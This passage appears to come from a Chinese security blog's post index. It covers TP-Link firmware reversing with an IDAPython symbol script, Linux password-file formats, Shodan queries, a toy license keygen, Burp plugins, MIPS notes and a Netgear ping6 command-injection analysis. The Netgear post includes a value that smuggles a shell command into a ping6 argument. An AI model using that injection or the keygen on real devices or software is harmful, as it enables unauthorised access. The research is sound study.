e313 e5ba 90Z.o\\ec.B.i.... 000b62a0: 030b ba40 fb20 2705 c2c4 64d9 fe98 78de ...@. \u0026#39;...d...x. 000b62b0: be68 ffff ffff ffff ffff ffff ffff ffff .h.............. ... 000b6ff0: ffff ffff ffff ffff ffff ffff ffff ffff ................ 000b7000: 4d49 4e49 4653 0000 0000 0000 0000 0000 MINIFS.......... 000b7010: 0000 0002 0000 0086 0001 f400 0007 557c ..............U| 000b7020: 921c 644e ae88 d9d2 2db4 48ce 5ceb 6951 ..dN....-.H.\\.iQ 所以实际的lzma文件\ndd if=wr886nv6.bin of=a200.lzma bs=1 skip=41472 count=746162 # 746162=0x000b62b0+2 IDA的加载 IDA无法直接识别文件,所以需要确定CPU架构和基址\n架构:\n通过 binwalk -Y获取结果:\n基址:\n通过strings对文件进行字符输出,可以看到:\n# Example: # mem -dump 80010000 1000 .... Show memory block start at 0x80010000 which size of 4k. 20065 # tftp -get 192.168.1.100 wr740nv5-cn.bin 80001000 .... 20066 # Download file wr740nv5-cn.bin from tftp server(192.168.1.100) to 20067 # local memory address 0x80001000. 应该就可以判断基址是0x80001000\n然后IDA设置一下CPU架构mipseb和基址.\n但是IDA打开之后,只进行了有限的自动分析,依然存在很多没有被分析的函数\n(TODO 可以尝试自己些IDApython 脚本)\n符号表的导入 通过对VxWorks关键词 bzero进行搜索(关键词来源? )\n➜ grep -r bzero . Binary file ./C2E3A matches 独立符号文件特征:\n1 00000000: 0001 f3fe 0000 139f 5400 0000 8017 c3d8 ........T....... 2 00000010: 5400 0006 8018 b8b0 5400 0014 8018 bef0 T.......T....... 3 00000020: 5400 0022 8018 b878 5400 002b 8018 c52c T..\u0026#34;...xT..+..., 4 00000030: 5400 0035 8017 c330 5400 0043 8018 000c T..5...0T..C.... 5 00000040: 5400 0051 8017 db8c 5400 0062 8018 14ec T..Q....T..b.... 6 00000050: 5400 0075 8001 8684 5400 0082 8001 8e04 T..u....T....... 7 00000060: 5400 0098 8017 f110 5400 00a4 8018 1604 T.......T....... 8 00000070: 5400 00b6 8018 1698 5400 00c9 8018 4bb8 T.......T.....K. 每8个bytes为一组, 然后第三第四的数值是递增的, 第5到第8字节和地址很像\ns\n编写IDApytho脚本 对symbol文件进行分析 可以看到,对符号名的描述从00000008开始, 而00009d00开始出现symbol对应的字符串.\n5400 0000 8017 c3d8 中:\n第0字节 54 表示类型(?)\n第1-3字节 00 0000表示symbol文件中的偏移\n第4-7字节8017 C3D8表示二进制文件对应的地址\n进入IDA后 8017C3D8 地址处 IDA并没有分析, 但是按c分析结果如下, 并且该函数名按照符号表对应为AddCA\nROM:8017C3D8 # --------------------------------------------------------------------------- ROM:8017C3D8 addiu $sp, -0x318 ROM:8017C3DC sw $ra, 0x310($sp) ROM:8017C3E0 sw $s7, 0x30C($sp) ROM:8017C3E4 sw $s6, 0x308($sp) ROM:8017C3E8 sw $s5, 0x304($sp) ROM:8017C3EC sw $s4, 0x300($sp) ... IDApython脚本:\nsymfile =\u0026#34;xxx/xxxx/C2E3A\u0026#34; symbols_table_start_offset = 0x08 strings_table_start_offset = 0x9d00 with open(symfile, \u0026#34;rb\u0026#34;) as f: symfile_contents = f.read() # 获取symbol 相关数据 symbols_table = symfile_contents[symbols_table_start_offset:strings_table_start_offset] # 获取对应字符 strings_table = symfile_contents[strings_table_start_offset:] # strings 直接通过 \\x00 进行分割; def get_string_by_offset(offset): index = 0 while True: if strings_table[offset+index] != \u0026#34;\\x00\u0026#34;: index += 1 else: break return strings_table[offset:offset+index] # 将8个字节的symbol数据结构进行拆解 def get_symbols_metadata(): symbols = [] for offset in range(0, len(symbols_table), 8): symbol_item = symbols_table[offset:offset+8] flag = symbol_item[0] #第一个字节 string_offset = int(symbol_item[1:4].encode(\u0026#39;hex\u0026#39;), 16) # 2-4 bytes string_name = get_string_by_offset(string_offset) target_address = int(symbol_item[-4:].encode(\u0026#39;hex\u0026#39;), 16) #5-8 bytes symbols.append((flag, string_name, target_address)) return symbols def add_symbols(symbols): for flag, string_name, target_address in symbols: idc.MakeName(target_address, string_name) if flag ==\u0026#34;\\x54\u0026#34;: idc.MakeCode(target_address) idc.MakeFunction(target_address) if __name__ == \u0026#39;__main__\u0026#39;: symbols = get_symbols_metadata() add_symbols(symbols) 另一种方式:(如果严格一一对应的话,那么可以直接将strings直接通过\\x00进行split,然后对应起来)\n不过好像有时候会出问题。\nsymfile =\u0026#34;xxxx/C2E3A\u0026#34; symbols_table_start_offset = 0x08 strings_table_start_offset = 0x9d00 with open(symfile, \u0026#34;rb\u0026#34;) as f: symfile_contents = f.read() # 获取symbol 相关数据 symbols_table = symfile_contents[symbols_table_start_offset:strings_table_start_offset] strings_table = symfile_contents[strings_table_start_offset:] symbol_strings = strings_table.split(chr(0)) def get_symbols_metadata(): symbols_metadata = [] num = 0 for offset in range(0, len(symbols_table), 8): symbol_item = symbols_table[offset:offset+8] flag = symbol_item[0] target_addr = int(symbol_item[-4:].encode(\u0026#39;hex\u0026#39;), 16) symbols_metadata.append((flag, symbol_strings[num], target_addr)) num += 1 return symbols_metadata def add_symbols(symbols_metadata): for flag, string_name, target_address in symbols_metadata: idc.MakeName(target_address, string_name) if flag ==\u0026#34;\\x54\u0026#34;: idc.MakeCode(target_address) idc.MakeFunction(target_address) symbols_metadata = get_symbols_metadata() add_symbols(symbols_metadata) 运行完之后符号已经修复了\nreferer:\nhttp://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%86%e6%9e%90-%e5%9b%ba%e4%bb%b6%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90/\nhttps://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/\nhttps://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html\n","permalink":"https://chibataiki.github.io/posts/tp-link_wr886nv6_vxworks_firmware_analysis/","summary":"文件系统的提取 看第一篇参考文献的时候,尝试了下,找到了Tp_Link_wr886nv6的固件.\nbinwalk 扫描结果:\n考虑到wr886nv6的内存空间, 这个解压大小2M左右的lzma压缩文件就可能比较有意思.\n但是根据binwalk的两个文件初始位置进行分割会有点小问题,所以需要通过hex查看一下真实的有效数据是多大. 类似于这样: 真实数据到 0x00b6b2就结束了\n000b6280: 500f 1765 1fee 46eb f9ca c213 2911 9afe P..e..F.....)... 000b6290: 3930 5afb 6f5c 6563 9742 d169 e313 e5ba 90Z.o\\ec.B.i.... 000b62a0: 030b ba40 fb20 2705 c2c4 64d9 fe98 78de ...@. \u0026#39;...d...x. 000b62b0: be68 ffff ffff ffff ffff ffff ffff ffff .h.............. ... 000b6ff0: ffff ffff ffff ffff ffff ffff ffff ffff ................ 000b7000: 4d49 4e49 4653 0000 0000 0000 0000 0000 MINIFS.","title":"Tp_Link_wr886nv6_VxWorks_firmware_analysis"},{"content":"介绍 Polypyus通过对相似二进制文件中已知函数的提取,从而对二进制文件函数进行定位.不需要对二进制文件进行反汇编(). 基于二进制的方式也使得运行速度很快. 但是缺点是需要很多相同架构,相同编译选项的二进制文件.\nPolypyus集成了一些现有的工具流程(Giidra, IDA, bindiff, Diaphora). 它可以将已经注释过的函数导入并从中学习,并将找出的函数导出到IDA中. Polypyus的门槛很高,因此只有在作者的实验中能够进行找到正确的匹配. 虽然不过强大但是 将匹配好的结果导入IDA中能够改善IDA的自动分析结果, 然后运行BinDiff\nBinDiff: 二进制文件的比较工具,帮助快速找到反汇编代码的相同点和不同点.\n解决的问题 IDA 6.8的自动分析比较激进,导致某些误报\nDIA 7.2则略保守,导致一些漏报\nBinDiff对于byte类型的函数,识别经常会出错. 但是Polupyus则对于byte类型函数识别的很精确. 推测BinDiff的出错原因是: 由于函数的缺失和误报导致生成的控制流图有所不同.有时这些函数已经被DIA所识别,但是IDA不会认为这些是代码或者函数.\nAmnesia: ?\nAmnesia在找到很多函数的同时也找到了很多的误报. 但是,很多函数初试时设置的栈桢可能是相似的. 因此Polypyus有个设置: 可以通过带有注释的二进制输入文件去学习通用的函数起始地址,并在其他二进制文件中用来识别函数,而不需要匹配函数名.不过该设置只适用于之前没有确认出函数的区域,这样可以避免冲突.\n如何工作 Polypyus 收集带有注释的固件二进制文件,通过对共有的函数进行二进制模糊匹配.\n支持带注释的文件:\nWICED Studio 的 patch.elf 文件,包含symbol definition most ARM compilers 生成的 .symdefs 文件 .csv 文件 输入的二进制文件的共性越多,polypyus的效果越好.\n安装和使用 效果图:\n问题在于: annotated binary 哪来!\nreferer:\nhttps://github.com/seemoo-lab/polypyus\n","permalink":"https://chibataiki.github.io/posts/polypyus_about/","summary":"介绍 Polypyus通过对相似二进制文件中已知函数的提取,从而对二进制文件函数进行定位.不需要对二进制文件进行反汇编(). 基于二进制的方式也使得运行速度很快. 但是缺点是需要很多相同架构,相同编译选项的二进制文件.\nPolypyus集成了一些现有的工具流程(Giidra, IDA, bindiff, Diaphora). 它可以将已经注释过的函数导入并从中学习,并将找出的函数导出到IDA中. Polypyus的门槛很高,因此只有在作者的实验中能够进行找到正确的匹配. 虽然不过强大但是 将匹配好的结果导入IDA中能够改善IDA的自动分析结果, 然后运行BinDiff\nBinDiff: 二进制文件的比较工具,帮助快速找到反汇编代码的相同点和不同点.\n解决的问题 IDA 6.8的自动分析比较激进,导致某些误报\nDIA 7.2则略保守,导致一些漏报\nBinDiff对于byte类型的函数,识别经常会出错. 但是Polupyus则对于byte类型函数识别的很精确. 推测BinDiff的出错原因是: 由于函数的缺失和误报导致生成的控制流图有所不同.有时这些函数已经被DIA所识别,但是IDA不会认为这些是代码或者函数.\nAmnesia: ?\nAmnesia在找到很多函数的同时也找到了很多的误报. 但是,很多函数初试时设置的栈桢可能是相似的. 因此Polypyus有个设置: 可以通过带有注释的二进制输入文件去学习通用的函数起始地址,并在其他二进制文件中用来识别函数,而不需要匹配函数名.不过该设置只适用于之前没有确认出函数的区域,这样可以避免冲突.\n如何工作 Polypyus 收集带有注释的固件二进制文件,通过对共有的函数进行二进制模糊匹配.\n支持带注释的文件:\nWICED Studio 的 patch.elf 文件,包含symbol definition most ARM compilers 生成的 .symdefs 文件 .csv 文件 输入的二进制文件的共性越多,polypyus的效果越好.\n安装和使用 效果图:\n问题在于: annotated binary 哪来!\nreferer:\nhttps://github.com/seemoo-lab/polypyus","title":"Polypyus_about"},{"content":"登陆机制相关文件:\ngroups\npasswd\nshaodow\n/etc/group : user group file 用来分配用户组的文件权限?,通过:分为四个部分\ngroup name group password, x表示密码为空 group ID group包含的用户 Samples: root:\\x:0: daemon:\\x:1: adm:\\x:4:root,syslog /etc/passwd: use names 分为7个部分,通过:分隔\nusername\n密码的hash值,或者 x表示密码存储在/etc/shadow中,! 表示passwd被锁定,不能通过密码登陆,但是可以通过(ssh key)登陆, *表示不允许登陆\nuid\ngid\n注释\n用户的home目录\n(可选项) 用户的shell\nsample:\nroot:\\x:0:0:Linux User,,,:/usr/share/ftp_server:/bin/sh ftp:*:95:95::/usr/share/ftp_server:/bin/sh sync:\\x:4:65534:sync:/bin:/bin/sync root:!:0:0:root:/tmp:/bin/ash games:\\x:5:60:games:/usr/games:/usr/sbin/nologin admin:$1$G555555$99999999999999/:500:500:admin:/tmp:/usr/bin/clish /etc/shadow : user password 只有特权用户可以访问,所以提高了密码的安全性,(这一点上很多嵌入式设备是直接将密码hash嵌入/etc/passwd中,所以不够安全)\nlogin name\n算法,salt和hash值 或者 特殊字符\n$id$salt$hashed\nid:\n$1$ – MD5 $2a$ – Blowfish $2y$ – Eksblowfish $5$ – SHA-256 $6$ – SHA-512 \u0026hellip; 和密码日期相关 略\nsample:\nroot:$6$qQSEjrI$/krm4VuFwoD2CCbOSgN1ruZDP6esGKS1hoKNlEuagVDjzLMMwN9.:18394:0:99999:7::: referer:\nhttp://forums.dlink.com/index.php?PHPSESSID=jqcpi0ouvefltgp57unhp9jia4\u0026amp;topic=41475.0\nhttps://en.wikipedia.org/wiki/Linux_user_group\nhttps://en.wikipedia.org/wiki/Passwd#Shadow_file\n","permalink":"https://chibataiki.github.io/posts/linux-users-groups/","summary":"登陆机制相关文件:\ngroups\npasswd\nshaodow\n/etc/group : user group file 用来分配用户组的文件权限?,通过:分为四个部分\ngroup name group password, x表示密码为空 group ID group包含的用户 Samples: root:\\x:0: daemon:\\x:1: adm:\\x:4:root,syslog /etc/passwd: use names 分为7个部分,通过:分隔\nusername\n密码的hash值,或者 x表示密码存储在/etc/shadow中,! 表示passwd被锁定,不能通过密码登陆,但是可以通过(ssh key)登陆, *表示不允许登陆\nuid\ngid\n注释\n用户的home目录\n(可选项) 用户的shell\nsample:\nroot:\\x:0:0:Linux User,,,:/usr/share/ftp_server:/bin/sh ftp:*:95:95::/usr/share/ftp_server:/bin/sh sync:\\x:4:65534:sync:/bin:/bin/sync root:!:0:0:root:/tmp:/bin/ash games:\\x:5:60:games:/usr/games:/usr/sbin/nologin admin:$1$G555555$99999999999999/:500:500:admin:/tmp:/usr/bin/clish /etc/shadow : user password 只有特权用户可以访问,所以提高了密码的安全性,(这一点上很多嵌入式设备是直接将密码hash嵌入/etc/passwd中,所以不够安全)\nlogin name\n算法,salt和hash值 或者 特殊字符\n$id$salt$hashed\nid:\n$1$ – MD5 $2a$ – Blowfish $2y$ – Eksblowfish $5$ – SHA-256 $6$ – SHA-512 \u0026hellip; 和密码日期相关 略","title":"Linux Login"},{"content":"a sample example\nset pagination off set logging file gdb.output set logging on break xxxx.c:[line number] commands silent p p p eod bt c end run set logging off quit run : gdb -x gdb_script -args [program] [program arguments]\nreference:\nhttps://sdimitro.github.io/post/scripting-gdb/\nhttps://sourceware.org/gdb/current/onlinedocs/gdb/Break-Commands.html\n","permalink":"https://chibataiki.github.io/posts/gdb-script/","summary":"a sample example\nset pagination off set logging file gdb.output set logging on break xxxx.c:[line number] commands silent p p p eod bt c end run set logging off quit run : gdb -x gdb_script -args [program] [program arguments]\nreference:\nhttps://sdimitro.github.io/post/scripting-gdb/\nhttps://sourceware.org/gdb/current/onlinedocs/gdb/Break-Commands.html","title":"Gdb Script"},{"content":"firmwalker https://github.com/craigz28/firmwalker\n比较早的一个项目,bash编写,keywords patterns比较单薄\nstatic-firmware-analysis https://github.com/secjey/static-firmware-analysis\n灵感来自于firmwalker, 由python编写,比firmwalker多了一写匹配内容\ntrommel 参考了firmwalker,由python编写,相比来说最为完善\nemba https://github.com/e-m-b-a/emba\n简单看了下有挺多功能，比较有趣的是对 vulnerable function的检测，但是仅仅只是检测func的数量。\n","permalink":"https://chibataiki.github.io/posts/embedded_device_filesystem_analyze/","summary":"firmwalker https://github.com/craigz28/firmwalker\n比较早的一个项目,bash编写,keywords patterns比较单薄\nstatic-firmware-analysis https://github.com/secjey/static-firmware-analysis\n灵感来自于firmwalker, 由python编写,比firmwalker多了一写匹配内容\ntrommel 参考了firmwalker,由python编写,相比来说最为完善\nemba https://github.com/e-m-b-a/emba\n简单看了下有挺多功能，比较有趣的是对 vulnerable function的检测，但是仅仅只是检测func的数量。","title":"嵌入式设备文件系统分析工具"},{"content":"Abstract first public, large-scale analysis of firmware images.\nunpacked 32 thousand firmware images into 1.7 million individual files\nshow the main benefits of look- ing at many different devices at the same time\ndiscovered a total of 38 previously unknown vulnerabilities in over 693 firmware images.\ncorrelating similar files inside apparently unrelated firmware images\n1. Introduction IoT devices:\nCommon- Off-The-Shelf (COTS) devices : printers, mobile phones, home routers, and computer components and peripherals.\nless consumer oriented : video surveillance systems, medical implants, car elements, SCADA and PLC devices, anything electronics.\nfirmware definition:\nOld:\nThe term was originally introduced to describe the CPU microcode that existed “somewhere” between the hardware and the software layers.\nIEEE:\nIEEE Std 610.12-1990 [6] extended the definition to cover the “combination of a hardware device and computer instructions or computer data that reside as read-only software on the hardware device”.\nNow: describe the software that is embedded in a hard- ware device.\n关于人工分析和大规模自动化分析\n人工分析:结果精确,但对经验要求高,速度慢,难以进行大规模分析,难以评估整体的安全性 自动化分析:xx\n漏洞的同源性: 同一个承包商,或是使用同一工具,SDK, 不同品牌贴牌的同一产品\u0026hellip;\n1.1 Methodology static analysis scales better than dynamic analysis as it does not require access to the physi- cal devices.\ncollecting firmware images\nthe contribution of this paper : not in the static analysis techniques we use (for example, we did not perform any static code analysis)\nbut to show the advantages of an horizontal, large-scale exploration.\nimplemented a correlation engine to compare and find similarities between all the objects in our dataset.\n1.2 result collected an initial set of 759,273 files (total 1.8TB of storage space) from publicly accessible firmware update sites. After filtering, left with 172,751 potential firmware images. sampled a set of 32,356 firmware candidates\nUsing a private cloud deployment of 90 worker nodes.\nautomatically discover and report 38 new vulnerabilities, confirm several that were already known\nextracted private RSA keys and their self-signed certificates used in about 35,000 online devices several dozens of hard-coded password hashes. Most were week identified a number of possible backdoors such as the authorized_keys file a number of hard-coded telnetd credentials hard-coded web-login admin credentials a number of backdoor daemons and web pages 1.3 Contributions • We show the advantages of performing a large-scale analysis of firmware images and describe the main challenges associated with this activity.\n• We propose a framework to perform firmware collection, filtering, unpacking and analysis at large scale. • We implemented several efficient static techniques that we ran on 32, 356 firmware candidates. • We present a correlation technique which allows to propagate vulnerability information to similar firm- ware images. • We discovered 693 firmware images affected by at least one vulnerability and reported 38 new CVEs.\n2 challenge: Building a Representative Dataset\nFirmware Identification\nUnpacking and Custom Formats\nScalability and Computational Limits\nResults Confirmation\n3.1 Architecture 3.2 Firmware Acquisition and Storage web crawler: from support pages; ftp server ;Google Custom Search Engines\n3.3 Unpacking and Analysis binwalk,FRAK ,Binary Analysis Toolkit (BAT)\npaper\u0026rsquo;s framework, (但是不开源,http://firmware.re/)\nPassword Hash Cracking use CUDA-enabled John The Ripper\n遇到硬编码hash认证的时候可以更快破解密码\n3.4 Correlation Engine Shared Credentials and Self-Signed Certificates\n(由于大量的OEM,对于嵌入式设备来说很常见)\nkeyword\nFuzzy hashes\n计算文件之间的相似度\n3.5 Data Enrichment 1.from: Shodan,Google Custom Search Engines\nby: web pages title , web servers authentication realms\n2.correlate SSL certificates (firmware,zmap)\n将两者的数据进行匹配,可以评估公网上易受漏洞影响的设备数量.\n4.2 result Files Formats ARM (63%) MIPS (7%) Vx- Works, Nucleus RTOS and Windows CE together: 7%. Password Hashes Statistics /etc/passwd /etc/shadow Certificates and Private RSA Keys Statistics Packaging Outdated and Vulnerable Software old kernel old busybox \u0026hellip; Building Images as root (很多嵌入式设备,是没有权限管理的) Web Servers Configuration (同样很多web server的user是root) ","permalink":"https://chibataiki.github.io/posts/a-large-scale-analysis-of-the-security-of-embedded-firmwares/","summary":"Abstract first public, large-scale analysis of firmware images.\nunpacked 32 thousand firmware images into 1.7 million individual files\nshow the main benefits of look- ing at many different devices at the same time\ndiscovered a total of 38 previously unknown vulnerabilities in over 693 firmware images.\ncorrelating similar files inside apparently unrelated firmware images\n1. Introduction IoT devices:\nCommon- Off-The-Shelf (COTS) devices : printers, mobile phones, home routers, and computer components and peripherals.","title":"A Large-Scale Analysis of the Security of Embedded Firmwares"},{"content":"过滤 include:\nfiltername:\u0026quot;value\u0026quot;\nexclude: - or ! -filtername:\u0026quot;value\u0026quot;\n筛选多值: , port: 22,23\nFilter: hash hash值为shodan data域的hash\nbanner text为空的时候,hash值为0\nhash:0 Filter: http.html_hash html的hash\n很多header存在Date值,此时使用hash值进行过滤就存在 漏报,可以采用http.html的hash值进行过滤\nhttp.html_hash:[hash value] 其他过滤规则类似,可以看raw数据进行筛选\nfavicon hash值的计算 import mmh3 import requests response = requests.get(\u0026#39;https://website/favicon.ico\u0026#39;) favicon = response.content.encode(\u0026#39;base64\u0026#39;) hash = mmh3.hash(favicon) print(hash) CLI shodan提供cli接口\npython3 -m pip install shodan shodan download [quary] shodan parse --fields ip_str,port,[fields] --separator , [download_file] shodan search --fields ip_str,port,[fields] [quary] ... referer:\nhttps://help.shodan.io/mastery/property-hashes\nhttps://cli.shodan.io/\n","permalink":"https://chibataiki.github.io/posts/shodan/","summary":"过滤 include:\nfiltername:\u0026quot;value\u0026quot;\nexclude: - or ! -filtername:\u0026quot;value\u0026quot;\n筛选多值: , port: 22,23\nFilter: hash hash值为shodan data域的hash\nbanner text为空的时候,hash值为0\nhash:0 Filter: http.html_hash html的hash\n很多header存在Date值,此时使用hash值进行过滤就存在 漏报,可以采用http.html的hash值进行过滤\nhttp.html_hash:[hash value] 其他过滤规则类似,可以看raw数据进行筛选\nfavicon hash值的计算 import mmh3 import requests response = requests.get(\u0026#39;https://website/favicon.ico\u0026#39;) favicon = response.content.encode(\u0026#39;base64\u0026#39;) hash = mmh3.hash(favicon) print(hash) CLI shodan提供cli接口\npython3 -m pip install shodan shodan download [quary] shodan parse --fields ip_str,port,[fields] --separator , [download_file] shodan search --fields ip_str,port,[fields] [quary] ... referer:\nhttps://help.shodan.io/mastery/property-hashes\nhttps://cli.shodan.io/","title":"shodan usage"},{"content":"一种简单的密码加密机制:\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(int argc, char *argv[]){ if(argc==2){ printf(\u0026#34;Checking License: %s\\n\u0026#34;,argv[1]); int sum=0; for(int i=0;i\u0026lt;strlen(argv[1]);i++){ sum += (int)argv[1][i]; } // printf(\u0026#34;%d\\n\u0026#34;,sum); if( 1022 == sum){ printf(\u0026#34;Accessed!\u0026#34;); } else { printf(\u0026#34;Wrong!\u0026#34;); } }else { printf(\u0026#34;Usage: %s \u0026lt;key\u0026gt;\\n\u0026#34;,argv[0]); } return 0; } 其中1022 是 \u0026ldquo;THIS IS THE KEY\u0026rdquo; 进行简单的ascii值求和的结果.\n可以通过静态分析和逆向工程可以分析出加密机制.\nkey generator 根据逆向分析的算法生成注册码\nimport random def check_key(key): char_sum=0 for c in key: char_sum += ord(c) return char_sum chars=\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34; key = \u0026#34;\u0026#34; while True: key += random.choice(chars) sum_temp = check_key(key) if sum_temp \u0026gt; 1022: key = \u0026#34;\u0026#34; elif sum_temp \u0026lt;1022: pass else: print(\u0026#34;Key:{}\u0026#34;.format(key)) referer:\nyoutube channel: liveoverflow\n","permalink":"https://chibataiki.github.io/posts/simple_key_validation/","summary":"一种简单的密码加密机制:\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(int argc, char *argv[]){ if(argc==2){ printf(\u0026#34;Checking License: %s\\n\u0026#34;,argv[1]); int sum=0; for(int i=0;i\u0026lt;strlen(argv[1]);i++){ sum += (int)argv[1][i]; } // printf(\u0026#34;%d\\n\u0026#34;,sum); if( 1022 == sum){ printf(\u0026#34;Accessed!\u0026#34;); } else { printf(\u0026#34;Wrong!\u0026#34;); } }else { printf(\u0026#34;Usage: %s \u0026lt;key\u0026gt;\\n\u0026#34;,argv[0]); } return 0; } 其中1022 是 \u0026ldquo;THIS IS THE KEY\u0026rdquo; 进行简单的ascii值求和的结果.\n可以通过静态分析和逆向工程可以分析出加密机制.\nkey generator 根据逆向分析的算法生成注册码\nimport random def check_key(key): char_sum=0 for c in key: char_sum += ord(c) return char_sum chars=\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34; key = \u0026#34;\u0026#34; while True: key += random.","title":"Simple_key_validation"},{"content":"netgear WNDR3700v4 存在命令注入漏洞,和认证绕过漏洞,相结合就可以未授权任意命令执行.\n使用固件版本: V1.0.1.42\n固件信息:\nLZMA compressed data Squashfs filesystem, little endian ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV)\n使用LZMA进行压缩,文件系统为Squashfs, MIPS32,big-end,使用system V 接口\n固件里一个/usr/sbin/net-cgi 程序里包含了很多功能,其中一个是 cmd_ping6(),如下:\n反编译一下大概就是:\nvoid cmd_ping6(char *target) { char cmd [132]; memset(cmd,0,0x80); sprintf(cmd,\u0026#34;ping6 -c 1 %s \u0026gt; /tmp/ping6_result 2\u0026gt;\u0026amp;1\u0026#34;,target); system(cmd); return; } 这里先将参数target格式化到命令字符串内,并存储在栈中 sprintf(target,\u0026quot;ping6 -c 1 %s \u0026gt; /tmp/ping6_result 2\u0026gt;\u0026amp;1\u0026quot;,target)\n因为sprintf 不检验长度,所以存在缓冲区溢出\n但是因为下面system函数直接调用了命令字符串,所以可以利用命令注入漏洞而不需要构造ROP链.\nsystem()将参数给/bin/sh进行调用, 所以target设置为: ; evid_command \u0026amp;\u0026gt; /dev/null\n那么执行完ping6 后,就会执行恶意命令.\n那么就要看如何控制传入cmd_ping6 的参数.\n交叉引用发现cgi_commit 调用了cmd_ping6\n而cgi_commit 则由loc_40535C: 调用, 而loc_40535C是apply.cgi MIME处理函数的一个输出. 所以当向apply.cgi进行post请求,并且post数据包含submit_flag=ping6时,cgi_commit()就会调用cmd_ping6()\nCGI MIME:[TODO] http://speed.eik.bme.hu/help/html/Special_Edition-Using_CGI/ch10.htm#WhatisMIME\nreferer: https://shadow-file.blogspot.com/2013/10/complete-persistent-compromise-of.html https://shadow-file.blogspot.com/2013/10/netgear-root-compromise-via-command.html\n","permalink":"https://chibataiki.github.io/posts/netgear_command_injection_vule_analysis/","summary":"netgear WNDR3700v4 存在命令注入漏洞,和认证绕过漏洞,相结合就可以未授权任意命令执行.\n使用固件版本: V1.0.1.42\n固件信息:\nLZMA compressed data Squashfs filesystem, little endian ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV)\n使用LZMA进行压缩,文件系统为Squashfs, MIPS32,big-end,使用system V 接口\n固件里一个/usr/sbin/net-cgi 程序里包含了很多功能,其中一个是 cmd_ping6(),如下:\n反编译一下大概就是:\nvoid cmd_ping6(char *target) { char cmd [132]; memset(cmd,0,0x80); sprintf(cmd,\u0026#34;ping6 -c 1 %s \u0026gt; /tmp/ping6_result 2\u0026gt;\u0026amp;1\u0026#34;,target); system(cmd); return; } 这里先将参数target格式化到命令字符串内,并存储在栈中 sprintf(target,\u0026quot;ping6 -c 1 %s \u0026gt; /tmp/ping6_result 2\u0026gt;\u0026amp;1\u0026quot;,target)\n因为sprintf 不检验长度,所以存在缓冲区溢出\n但是因为下面system函数直接调用了命令字符串,所以可以利用命令注入漏洞而不需要构造ROP链.\nsystem()将参数给/bin/sh进行调用, 所以target设置为: ; evid_command \u0026amp;\u0026gt; /dev/null\n那么执行完ping6 后,就会执行恶意命令.\n那么就要看如何控制传入cmd_ping6 的参数.\n交叉引用发现cgi_commit 调用了cmd_ping6","title":"Netgear-命令注入漏洞分析"},{"content":"使用 match/replace proxy-\u0026gt;Options-\u0026gt; March and Replace\n可以使用regex或者literal\n然后HTTP history 页面下方会多出一栏 Auto-modifided request, 点进去就可以看到修改过后的 request\n插件 Logger++ This extension can be used to log the requests and responses made by all Burp tools, and display them in a sortable table. It can also save the logged data in CSV format.\nRequires Java version 7.\nHTTP Request Smuggler This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.\nTODO: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\nTurbo Intruder Sending large numbers of HTTP requests and analyzing the results.\nFast - Turbo Intruder uses a HTTP stack hand-coded from scratch with speed in mind. As a result, on many targets it can seriously outpace even fashionable asynchronous Go scripts. Flexible - Attacks are configured using Python. This enables handling of complex requirements such as signed requests and multi-step attack sequences. Also, the custom HTTP stack means it can handle malformed requests that break other libraries. Scalable - Turbo Intruder can achieve flat memory usage, enabling reliable multi-day attacks. It can also be run in headless environments via the command line. Convenient - Boring results can be automatically filtered out by an advanced diffing algorithm adapted from Backslash Powered Scanner TODO: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack\nreferer: https://portswigger.net/bappstore\n","permalink":"https://chibataiki.github.io/posts/burpsuite-note/","summary":"使用 match/replace proxy-\u0026gt;Options-\u0026gt; March and Replace\n可以使用regex或者literal\n然后HTTP history 页面下方会多出一栏 Auto-modifided request, 点进去就可以看到修改过后的 request\n插件 Logger++ This extension can be used to log the requests and responses made by all Burp tools, and display them in a sortable table. It can also save the logged data in CSV format.\nRequires Java version 7.\nHTTP Request Smuggler This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks.","title":"Burpsuite使用note"},{"content":"特性 MIPS和ARM 一样是RISC精简指令集\n延迟槽 MIPS I 引入了延迟槽机制,以减少各种指令后流水线的阻塞.\nMIPS II 取消了延迟槽机制\nMIPS III 是MIPS II的一个后向兼容的扩展,并支持64位.\nMIPS \u0026hellip;\n指令格式 指令:32bits byte : 8bits word: 4bits, halfword: 2bits\nMIPS架构中, 指令分为三种类型,R型、I型和J型.\n寄存器 Register Number Conventional Name Usage $0 $zero 硬编码为0 $1 $at 保留给汇编器 $2 - $3 $v0, $v1 保存函数返回值 $4 - $7 $a0 - $a3 存储参数 $8 - $15 $t0 - $t7 存储临时数据 $16 - $23 $s0 - $s7 保存寄存器,存储后面用到的数据 $24 - $25 $t8 - $t9 存储临时数据 $26 - $27 $k0 - $k1 为内核保留 $28 $gp 全局指针 $29 $sp 堆栈指针 $30 $fp 保存栈指针 $31 $ra 返回地址 算数指令 opt $dst, $src, [xx] : $dst = $src + [xx]\nxxu : unsgined integers xxi : immediate\n控制指令 分支 bxx $t0, $t1, lable: xx: eq : equal\nlt : larger than\nle : less than\ngt : greater than\nge : greater equal\nne : not equal\n跳转 j lable : 无条件跳转到lable\njr $t3 : jump register ,跳转到$t3所存地址上.\n子程序调用\njal sub_label : jump and link\n$ra \u0026lt;— PC+4\nPC = sub_label\njalr register : 跳转地址来自于寄存器\n$ra \u0026lt;— PC+4\nPC \u0026lt;— $register\nload/ store 指令 只有load /store 